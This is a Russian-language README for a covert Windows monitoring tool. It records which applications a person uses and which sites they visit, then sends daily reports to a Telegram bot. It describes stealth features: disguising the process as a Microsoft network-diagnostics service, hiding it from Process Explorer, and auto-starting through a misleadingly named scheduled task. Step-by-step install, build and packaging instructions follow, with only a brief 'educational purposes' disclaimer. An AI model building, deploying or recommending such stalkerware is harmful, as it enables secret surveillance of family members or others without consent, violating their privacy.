# Family Activity Monitor

Скрытое Windows-приложение для мониторинга активности компьютера с отправкой отчётов в Telegram.

## Описание проекта

Приложение работает в фоновом режиме и отслеживает:
- **Активные приложения** — какие программы используются и сколько времени
- **Посещённые сайты** — домены, к которым происходит сетевое подключение

Данные сохраняются локально в SQLite и автоматически отправляются ежедневным отчётом в Telegram-бот. Приложение использует стелс-технологии для работы в невидимом режиме: минимизирует нагрузку на систему, скрывается от Process Explorer, шифрует данные.

## Архитектура

```
┌─────────────────┐
│  Task Scheduler │ ← Запускает при входе пользователя
└────────┬────────┘
         │
         ▼
┌─────────────────────────────────────┐
│       .NET 8.0 Host Service         │
├─────────────────────────────────────┤
│  ProcessMonitor                     │ → Отслеживает активное окно (Win32 API)
│  NetworkMonitor                     │ → Перехватывает DNS запросы (WMI)
│  TelegramBotService                 │ → Отправляет отчёты и принимает команды
│  StealthService                     │ → Маскирует процесс под системный
│  WatchdogService                    │ → Контролирует ресурсы CPU/RAM
├─────────────────────────────────────┤
│  Database (SQLite)                  │ → activity.db
│  EncryptionService                  │ → AES шифрование данных
└─────────────────────────────────────┘
```

### Принцип работы

**1. Мониторинг процессов (ProcessMonitor)**
- Каждую секунду вызывает `GetForegroundWindow()` для получения активного окна
- Определяет процесс через `GetWindowThreadProcessId()`
- Фильтрует системные процессы (explorer, svchost и т.д.)
- Накапливает время использования каждого приложения
- Сохраняет данные в БД каждую минуту

**2. Мониторинг сети (NetworkMonitor)**
- Каждые 5 секунд запрашивает DNS-запросы через WMI
- Извлекает доменные имена из сетевых подключений
- Фильтрует системные домены (microsoft.com, windows.net и т.д.)
- Отслеживает время взаимодействия с каждым доменом
- Данные сохраняются синхронно с ProcessMonitor

**3. Отправка отчётов (TelegramBotService)**
- В заданное время (по умолчанию 19:00) формирует отчёт за день
- Структура отчёта:
  ```
  📊 Отчёт за 17 января 2026
  
  🖥️ Приложения:
  • waterfox: 2ч 15м
  • Code: 1ч 42м
  
  🌐 Сайты:
  • github.com: 1ч 30м
  • stackoverflow.com: 45м
  ```
- Поддерживает команды: `/report`, `/stats`, `/help`, `/status`
- Авторизация по ChatID из конфигурации

**4. Защита и стелс (StealthService + WatchdogService)**
- Переименование процесса в `NetworkHealthMonitor.exe`
- Логи в системной папке `C:\ProgramData\Microsoft\NetworkDiagnostics`
- Контроль CPU (макс. 2%) и RAM (макс. 50 MB)
- Шифрование БД через AES-256 (ключ генерируется при установке)
- Автоматическая перезагрузка при сбоях

## Технические требования

- **ОС:** Windows 10/11 (x64)
- **.NET Runtime:** Не требуется — self-contained сборка (всё включено в .exe)
- **Права:** Администратор (только для установки)
- **Место на диске:** ~60 MB

## Установка из готового релиза

### Шаг 1: Получение токена Telegram-бота

1. Откройте [@BotFather](https://t.me/BotFather) в Telegram
2. Создайте нового бота командой `/newbot`
3. Скопируйте токен вида `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`
4. Получите ваш ChatID через [@userinfobot](https://t.me/userinfobot) — отправьте `/start` и скопируйте ID

### Шаг 2: Распаковка релиза

```powershell
# Скачайте и распакуйте архив релиза
Expand-Archive -Path WinFamilyMonitor.zip -DestinationPath C:\Temp\Monitor
cd C:\Temp\Monitor
```

### Шаг 3: Конфигурация

Откройте `appsettings.json` в текстовом редакторе и укажите:

```json
{
  "Telegram": {
    "BotToken": "ВАШ_ТОКЕН_ОТ_BOTFATHER",
    "AuthorizedUsers": [ВАШ_CHAT_ID]
  }
}
```

### Шаг 4: Установка

```powershell
# Запуск PowerShell от имени администратора (обязательно!)
.\install.ps1
```

Скрипт выполнит:
- Копирование файлов в `C:\ProgramData\Microsoft\NetworkDiagnostics`
- Генерацию уникального ключа шифрования
- Регистрацию задачи в Task Scheduler с автозапуском
- Запуск приложения

**Проверка установки:**
```powershell
Get-ScheduledTask -TaskName "WindowsNetworkHealthMonitor"
Get-Process -Name "NetworkHealthMonitor" -ErrorAction SilentlyContinue
```

### Удаление

```powershell
# Запуск от администратора
.\uninstall.ps1

# При запросе "Remove data and logs?" ответить "yes" для полного удаления
```

## Сборка из исходников

### Требования для разработки

- **Visual Studio 2022** или **JetBrains Rider** с поддержкой .NET 8.0
- **Windows SDK** (для Win32 API)
- **PowerShell 5.1+**

### Клонирование репозитория

```powershell
git clone <URL_РЕПОЗИТОРИЯ>
cd PRIVACYCHILD
```

### Конфигурация для разработки

Создайте `appsettings.json` на основе шаблона:

```powershell
Copy-Item appsettings.template.json appsettings.json
```

Настройте свои значения в `appsettings.json`.

### Сборка

**Метод 1: Visual Studio**
```
1. Открыть PRIVACYCHILD.sln
2. Build → Rebuild Solution
3. Выбрать конфигурацию Release | x64
```

**Метод 2: CLI**
```powershell
dotnet publish sample1.csproj `
  -c Release `
  -r win-x64 `
  --self-contained true `
  -p:PublishSingleFile=true `
  -p:IncludeNativeLibrariesForSelfExtract=true `
  -p:PublishTrimmed=false
```

Результат: `bin\Release\net8.0-windows\win-x64\publish\sample1.exe` (~51 MB)

### Подготовка пакета развёртывания

```powershell
.\prepare_deployment.ps1
```

Создаст папку `Deploy\` с готовым к распространению пакетом:
- `sample1.exe` — исполняемый файл
- `appsettings.json` — шаблон конфигурации (без токенов!)
- `install.ps1` / `uninstall.ps1` — скрипты установки
- `README.txt` — краткая инструкция

**Создание архива:**
```powershell
Compress-Archive -Path Deploy\* -DestinationPath WinFamilyMonitor.zip
```

## Использование

### Telegram команды

Доступные команды:
- /apps - Отчет по приложениям
- /network - Отчет по сайтам
- /settime HH:mm - Установить время отчетов

### Файлы и логи

```
C:\ProgramData\Microsoft\NetworkDiagnostics\
├── NetworkHealthMonitor.exe          # Основной процесс
├── appsettings.json                  # Конфигурация
├── activity.db                       # База данных (зашифрована)
└── Logs\
    └── service{date}.log             # Логи (DEBUG уровень)
```

### Мониторинг работы

```powershell
# Проверка задачи
Get-ScheduledTask "WindowsNetworkHealthMonitor" | Get-ScheduledTaskInfo

# Проверка процесса
Get-Process NetworkHealthMonitor | Format-List *

# Просмотр логов
Get-Content "C:\ProgramData\Microsoft\NetworkDiagnostics\Logs\service*.log" -Tail 50
```

## Безопасность

⚠️ **Важно:** Этот проект создан исключительно в образовательных целях для демонстрации технологий мониторинга Windows. Использование для слежения за другими людьми без их согласия незаконно во многих юрисдикциях.

**Защитные меры:**
- Шифрование базы данных AES-256
- Хранение токена только локально
- HTTPS для Telegram API
- `appsettings.json` исключён из git-репозитория
- Минимальные системные привилегии после установки

**Рекомендации:**
- Используйте бота только в приватных чатах
- Регулярно меняйте токен бота через BotFather
- Настройте DataRetentionDays (по умолчанию 7 дней)
- Не храните токены в облачных репозиториях

## Решение проблем

**Приложение не запускается**
```powershell
# Проверьте логи на ошибки
Get-Content "C:\ProgramData\Microsoft\NetworkDiagnostics\Logs\*.log" | Select-String "ERR"

# Проверьте конфигурацию
Get-Content "C:\ProgramData\Microsoft\NetworkDiagnostics\appsettings.json"
```

**Бот не отвечает**
- Проверьте токен бота через [@BotFather](https://t.me/BotFather) → `/mybots`
- Убедитесь что ChatID правильный (числовое значение)
- Проверьте интернет-соединение

**Нет данных о приложениях**
```powershell
# Убедитесь что задача запущена в контексте пользователя, а не SYSTEM
Get-ScheduledTask "WindowsNetworkHealthMonitor" | Select-Object -ExpandProperty Principal
```

**Высокое потребление ресурсов**
- Настройте `MaxCpuPercent` и `MaxMemoryMB` в конфигурации
- Увеличьте интервалы мониторинга (`ProcessCheckIntervalMs`, `NetworkCheckIntervalMs`)

## Структура проекта

```
PRIVACYCHILD/
├── Program.cs                        # Точка входа, настройка DI
├── sample1.csproj                    # Конфигурация проекта
├── appsettings.template.json         # Шаблон конфигурации
│
├── Bot/
│   ├── TelegramBotService.cs         # Интеграция с Telegram API
│   └── ReportGenerator.cs            # Формирование отчётов
│
├── Data/
│   └── Database.cs                   # SQLite работа с БД
│
├── Models/
│   ├── ActivityRecord.cs             # Модели данных
│   └── AppConfig.cs                  # Конфигурационные модели
│
├── Monitoring/
│   ├── ProcessMonitor.cs             # Мониторинг активных окон
│   └── NetworkMonitor.cs             # Мониторинг сетевых подключений
│
├── Security/
│   ├── EncryptionService.cs          # AES шифрование
│   ├── StealthService.cs             # Маскировка процесса
│   └── WatchdogService.cs            # Контроль ресурсов
│
├── Services/
│   ├── IActivityMonitor.cs           # Интерфейсы сервисов
│   └── IDataService.cs
│
└── Deploy/                           # Готовый пакет (после build)
    ├── sample1.exe
    ├── install.ps1
    ├── uninstall.ps1
    └── appsettings.json
```

## Лицензия

MIT License — свободное использование с указанием авторства.

## Поддержка

При обнаружении проблем создавайте Issues в репозитории с описанием:
- Версия Windows
- Содержимое логов
- Шаги воспроизведения ошибки
